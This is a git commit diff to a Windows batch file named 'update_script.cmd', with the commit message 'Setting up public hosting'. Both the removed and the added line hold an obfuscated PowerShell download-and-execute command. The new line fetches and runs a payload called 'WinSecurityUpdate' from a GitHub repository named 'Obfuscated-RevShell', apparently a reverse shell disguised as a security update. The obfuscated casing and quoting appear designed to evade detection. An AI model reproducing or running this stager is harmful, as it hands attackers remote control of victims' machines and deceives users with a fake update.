a2b36ff2124ed62e9b0591461d3749d86e7db97e
CyberJunnkie <abdullahyasin3295@gmail.com>
2021-09-04 03:23:09 -0400

    Setting up public hosting

--- update_script.cmd
+++ update_script.cmd
@@ -1,2 +1,2 @@
 @ECHO OFF
-po""weR""sHelL -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('http://192.168.125.128/WinSecurityUpdate')"
+po""weR""sHelL -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('https://github.com/CyberJunnkie/Obfuscated-RevShell/blob/master/WinSecurityUpdate')"
